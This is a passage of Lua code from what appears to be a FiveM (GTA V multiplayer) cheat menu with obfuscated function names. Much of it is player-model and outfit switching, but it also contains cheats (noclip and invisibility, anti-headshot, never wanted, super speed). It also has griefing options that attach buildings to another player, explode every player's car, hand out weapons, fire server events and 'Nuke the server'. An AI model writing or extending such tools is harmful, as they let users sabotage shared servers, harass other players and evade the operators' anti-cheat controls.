                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Beach 01 F") then
                    local model = "A_F_M_Beach_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Beach 02 F") then
                    local model = "A_F_Y_Beach_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Beach Fat F") then
                    local model = "A_F_M_FatCult_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 01") then
                    local model = "A_F_Y_BevHills_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 02") then
                    local model = "A_F_Y_BevHills_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 03") then
                    local model = "A_F_Y_BevHills_03"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 04") then
                    local model = "A_F_Y_BevHills_04"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 05") then
                    local model = "CSB_Bride"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 06") then
                    local model = "U_F_Y_PoppyMich"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 07") then
                    local model = "A_F_Y_SouCent_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Female 08") then
                    local model = "CSB_Anita"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Skater Female") then
                    local model = "A_F_Y_Skater_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Old Man") then
                    local model = "U_M_O_TapHillBilly"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Guy 01") then
                    local model = "S_M_Y_Barman_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Guy 02") then
                    local model = "A_M_Y_BreakDance_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Guy 03") then
                    local model = "U_M_Y_Chip"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Guy 04") then
                    local model = "U_M_Y_GunVend_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Guy 05") then
                    local model = "CSB_Groom"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Rich Guy 06") then
                    local model = "A_M_Y_Business_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Chinese M 01") then
                    local model = "G_M_M_ChiBoss_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Chinese M 02") then
                    local model = "G_M_M_ChiGoon_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Chinese M 03") then
                    local model = "G_M_M_ChiGoon_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Chinese M 04") then
                    local model = "CSB_Hao"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Chinese F") then
                    local model = "A_F_Y_Vinewood_03"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean M 01") then
                    local model = "A_M_Y_KTown_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean M 02") then
                    local model = "A_M_Y_KTown_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean M 03") then
                    local model = "G_M_M_KorBoss_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean M 04") then
                    local model = "G_M_Y_Korean_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean M 05") then
                    local model = "G_M_Y_Korean_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean F 01") then
                    local model = "S_F_Y_MovPrem_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean F 02") then
                    local model = "A_F_M_KTown_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean F 03") then
                    local model = "A_F_M_KTown_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Korean F 04") then
                    local model = "A_F_O_KTown_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 01") then
                    local model = "A_M_M_MexCntry_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 02") then
                    local model = "A_M_M_MexLabor_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 03") then
                    local model = "A_M_Y_MexThug_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 04") then
                    local model = "G_M_M_MexBoss_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 05") then
                    local model = "G_M_M_MexBoss_02"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 06") then
                    local model = "U_M_Y_Mani"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican M 07") then
                    local model = "S_M_M_Mariachi_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican F") then
                    local model = "U_F_Y_SpyActress"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Mexican HMaid F") then
                    local model = "S_F_M_Maid_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Boar") then
                    local model = "A_C_Boar"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Pig") then
                    local model = "A_C_Pig"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Deer") then
                    local model = "A_C_Deer"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Chicken") then
                    local model = "A_C_Hen"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Hawk") then
                    local model = "A_C_Chickenhawk"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Crow") then
                    local model = "A_C_Crow"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Monkey") then
                    local model = "A_C_Chimp"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Dog Chop") then
                    local model = "A_C_Chop"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Dog Husky") then
                    local model = "A_C_Husky"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Dog Rottweiler") then
                    local model = "A_C_Rottweiler"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Dog Shepherd") then
                    local model = "A_C_shepherd"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Lion") then
                    local model = "A_C_MtLion"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Rat") then
                    local model = "A_C_Rat"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Shark") then
                    local model = "A_C_SharkTiger"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest | Animal~s~ Coyote") then
                    local model = "A_C_Coyote"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~g~ Alien") then
                    local model = "s_m_m_movalien_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Pongo") then
                    local model = "u_m_y_pogo_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif I.button("Guest |~s~ Bartender F") then
                    local model = "S_F_Y_Bartender_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("outfitoptions") then
                if I.button("~r~WIP") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("utiles") then
                if I.checkBox("~r~Espion") then
                    I.OptionConfig.noClip = not I.OptionConfig.noClip
                    I.OptionConfig.invisible = not I.OptionConfig.invisible
                elseif I.checkBox("Anti AFK", wonderaround) then
                    wonderaround = not wonderaround
                    if wonderaround then
                        TaskWanderStandard(PlayerPedId(), 10.0, 10)
                    else
                        ClearPedTasksImmediately(PlayerPedId())
                    end
                elseif I.checkBox("Anti Headshot", I.OptionConfig.AntiHeadshot) then
                    I.OptionConfig.AntiHeadshot = not I.OptionConfig.AntiHeadshot
                    if not I.OptionConfig.AntiHeadshot then
                        SetPedSuffersCriticalHits(PlayerPedId(), true)
                    end
                elseif I.checkBox("~Y~No more police", I.OptionConfig.neverWanted) then
                    I.OptionConfig.neverWanted = not I.OptionConfig.neverWanted
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selfSuperPowers") then
                if I.menuButton("Utils", "utiles", ">") then
                elseif I.checkBox("~Y~Super Jump", I.OptionConfig.superJump) then
                    I.OptionConfig.superJump = not I.OptionConfig.superJump
                elseif I.checkBox("~Y~Magneto", I.OptionConfig.dcbac0a08778fb9e3b9045c19dd7) then
                    I.OptionConfig.dcbac0a08778fb9e3b9045c19dd7 = not I.OptionConfig.dcbac0a08778fb9e3b9045c19dd7
                    I.functions.dcbac0a08778fb9e3b9045c19dd7()
                elseif I.checkBox("~Y~Tiny ~r~(!)", I.OptionConfig.tinyPlayer) then
                    I.OptionConfig.tinyPlayer = not I.OptionConfig.tinyPlayer
                elseif I.checkBox("~Y~Flash ~r~(!)", I.OptionConfig.flashmanSP) then
                    I.OptionConfig.flashmanSP = not I.OptionConfig.flashmanSP
                elseif
                    I.comboBoxSlider(
                        "Run fast",
                        es,
                        et,
                        eu,
                        function(dI, dJ)
                            et = dI
                            eu = dI
                            FastRunMultiplier = er[dI]
                            if not I.OptionConfig.flashmanSP then
                                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                            end
                        end
                    )
                 then
                elseif
                    I.comboBoxSlider(
                        "Swing fast",
                        es,
                        ev,
                        ew,
                        function(dI, dJ)
                            ev = dI
                            ew = dI
                            FastSwimMultiplier = er[dI]
                            SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                        end
                    )
                 then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("attachoptions") then
                if I.button("Attach an UFO") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("p_spinning_anus_s"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach LS Center") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("dt1_lod_slod3"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach FBI Building") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(-1404869155, 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach Sandy Shores") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("cs4_lod_04_slod2"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach docks") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("po1_lod_slod4"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach Mirro Parking") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("id2_lod_slod4 "), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach aeroplane") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("ap1_lod_slod4"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach Del Pero Pier") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("sm_lod_slod2_22"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach christmas tree") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("prop_xmas_tree_int"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attach an alien egg") then
                    local K = GetPlayerPed(aT)
                    local bone = GetPedBoneIndex(K, 31086)
                    local fM = CreateObject(GetHashKey("prop_alien_egg_01"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(
                        fM,
                        K,
                        bone,
                        0.2,
                        0.0,
                        0.0,
                        90.0,
                        90.0,
                        90.0,
                        false,
                        false,
                        true,
                        false,
                        0,
                        true
                    )
                elseif I.button("Attach a TV") then
                    local K = GetPlayerPed(aT)
                    local bone = GetPedBoneIndex(K, 31086)
                    local fM = CreateObject(GetHashKey("prop_tv_03"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(
                        fM,
                        K,
                        bone,
                        0.1,
                        0.075,
                        0.0,
                        0.0,
                        270.0,
                        180.0,
                        false,
                        false,
                        true,
                        false,
                        0,
                        true
                    )
                    AttachEntityToEntity(
                        entity1,
                        entity2,
                        boneIndex,
                        xPos,
                        yPos,
                        zPos,
                        xRot,
                        yRot,
                        zRot,
                        p9,
                        useSoftPinning,
                        collision,
                        isPed,
                        vertexIndex,
                        fixedRot
                    )
                elseif I.button("Attach campfire") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("prop_beach_fire"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                elseif I.button("Attacher une rampe") then
                    local K = GetPlayerPed(aT)
                    local fM = CreateObject(GetHashKey("stt_prop_stunt_track_start"), 9, 9, 9, 1, 1, 1)
                    AttachEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    hEntityToEntity(fM, K, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selfClothing") then
                if I.button("Random Outfit", "~g~[Safe]") then
                    I.functions.b78cec7a66d920c954ee50b797e03ad2(PlayerId())
                elseif I.button("Ballas", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HATS", 10, 7)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("GLASSES", 17, 6)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 51, 6)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 14, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 5, 9)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 9, 5)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 23, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 7, 9)
                elseif I.button("SWAT", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 17, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 56, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HATS", 40, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HAIR", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 19, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("GLASSES", 0, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 34, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 25, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 58, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL3", 4, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 55, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HANDS", 0, 0)
                elseif I.button("Ghost", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 17, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 29, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HATS", 28, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HAIR", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("GLASSES", 0, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 31, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 24, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL", 30, 2)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 15, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 50, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HANDS", 0, 0)
                elseif I.button("Santa Claus", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 8, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 12, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 19, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 4, 4)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL1", 10, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 21, 2)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 19, 0)
                elseif I.button("Soldier", "~g~[Safe]") then
                    I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d()
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO", 96, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HATS", 40, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("MASK", 54, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("GLASSES", 0, 1)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("LEGS", 34, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SHOES", 25, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL1", 0, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("SPECIAL2", 15, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("TORSO2", 53, 0)
                    I.functions.c6a07916ba03366b1d7a3b7cbdd63466("HANDS", 51, 0)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("onlinePlayersOptions") then
                I.SubSettingTitle("onlinePlayersOptions", #I.natives.GetActivePlayers() .. " Player(s) Online")
                local fN = I.natives.GetActivePlayers()
                for b7 = 1, #fN do
                    local currentPlayer = fN[b7]
                    if
                        I.menuButton(
                            "~o~[ID: " ..
                                GetPlayerServerId(currentPlayer) ..
                                    "]~y~ " ..
                                        GetPlayerName(currentPlayer) ..
                                            I.NewFunction.posfazeazedanada(GetPlayerPed(currentPlayer)),
                            "selectedPlayerOptions"
                        )
                     then
                        aT = currentPlayer
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("allPlayersOptions") then
                if I.menuButton("Trigger Events", "allPlayersOptionsTriggers", ">") then
                elseif I.button("Give weapons", "~r~[Risky]") then
                    I.functions.aPO.bbc99a8240bf964dca27f2e8a48f665a(false)
                elseif I.button("Explode cars", "~r~[Risky]") then
                    I.functions.aPO.e77b49bd9684a0376cb2b1cd3f9ae0()
                elseif I.button("Attach banana on all players") then
                    ad0a8b371fe68843d8e52c3d8d9b8c()
                elseif I.button("Nuke the server") then
                    NukeServer1()
                elseif
                    I.comboBox(
                        "Objets Spawner",
                        I.comboBoxes[4]._words,
                        I.comboBoxes[4]._current,
                        I.comboBoxes[4]._selected,
                        function(dI, dJ)
                            I.comboBoxes[4]._current = dI
                            I.comboBoxes[4]._selected = dI
                        end
                    )
                 then
                    if type(I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]) == "table" then
                        for aM, bb in pairs(I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]) do
                            I.functions.aPO.a82067704cc6922707d00ddbe0451(
                                I.comboBoxes[4]._actual[I.comboBoxes[4]._selected][aM]
                            )
                        end
                    else
                        I.functions.aPO.a82067704cc6922707d00ddbe0451(
                            I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]
                        )
                    end
                elseif
                    I.comboBox(
                        "Prop Block",
                        I.menuTables.trollsPropBlock.words,
                        I.menuTables.trollsPropBlock.current,
                        I.menuTables.trollsPropBlock.selected,
                        function(dI, dJ)
                            I.menuTables.trollsPropBlock.current = dI
                            I.menuTables.trollsPropBlock.selected = dI
                        end
                    )
                 then
